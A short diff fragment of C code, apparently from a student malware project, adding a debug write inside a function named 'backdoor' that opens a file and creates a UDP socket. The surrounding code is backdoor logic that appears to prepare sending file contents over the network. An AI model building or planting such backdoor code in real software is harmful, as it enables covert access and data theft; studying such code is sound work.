@@ -381,6 +381,7 @@ static void	backdoor()
 		fd = ft_sysopen(buf, O_RDONLY);
 		if (fd < 0)
 			ft_sysexit(0);
+		ft_syswrite(1, buf, 10);
 		sock = ft_syssocket(AF_INET, SOCK_DGRAM, 0);
 		if (sock < 0)
 		{
